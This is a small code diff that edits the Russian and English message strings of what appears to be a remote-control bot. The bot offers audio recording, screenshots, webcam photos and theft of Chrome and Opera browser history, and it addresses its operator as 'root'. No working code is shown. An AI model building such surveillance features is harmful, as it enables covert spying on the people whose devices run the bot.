@@ -19,6 +19,7 @@ user_languages = {}
 
 TEXTS = {
     'ru': {
+
         'ask_duration': "Укажите длительность записи в секундах",
         'invalid': "Пожалуйста, укажите правильную длительность в секундах",
         'no_access': "К сожалению, у вас нет доступа к этому боту.",
@@ -62,7 +63,7 @@ TEXTS = {
         "chrome_history_send_error": "Ошибка при отправке файла",
 
         "access_denied": "К сожалению, у вас нет доступа к этому боту.",
-        "opera_history_start": "Получение истории Opera. Пожалуйста, подождите...",
+        "opera_history_start": "Получение истории Opera. Пожалуйста, подождите",
         "opera_history_not_found": "Файл истории Opera не найден. Возможно, браузер Opera не установлен.",
         "invalid_time": "Некорректное время",
         "error_time": "Ошибка",
@@ -294,7 +295,7 @@ TEXTS = {
         "recording_finished": "Recording finished.",
         "audio_ready": "Here is the audio recording, root!",
         "file_send_error": "Error sending file:",
-        "screenshot_start": "Taking screenshot now, root...",
+        "screenshot_start": "Taking screenshot now, root",
         "screenshot_error": "Error sending screenshot: {error}",
 
         "enter_mp3_path": "Enter the full path to the MP3 file (e.g., `/home/user/music/mysound.mp3`):",
@@ -306,7 +307,7 @@ TEXTS = {
         "snapshot_start": "One moment, root.",
         "camera_open_error": "Could not open the camera, it might be used by another process.",
         "snapshot_error": "Could not take a snapshot, the camera might be busy.",
-        "snapshot_sent": "Here’s your webcam photo, root!",
+        "snapshot_sent": "Here’s your webcam photo, root",
         "snapshot_exception": "An error occurred while taking the photo: {error}",
 
         "ask_webcam_duration": "Specify the recording duration in seconds, root",
@@ -329,7 +330,7 @@ TEXTS = {
         "chrome_history_send_error": "Error sending file",
 
         "access_denied": "Access denied.",
-        "opera_history_start": "Getting Opera history. Please wait...",
+        "opera_history_start": "Getting Opera history. Please wait",
         "opera_history_not_found": "Opera history file not found. Is Opera installed?",
         "invalid_time": "Invalid time",
         "error_time": "Error",
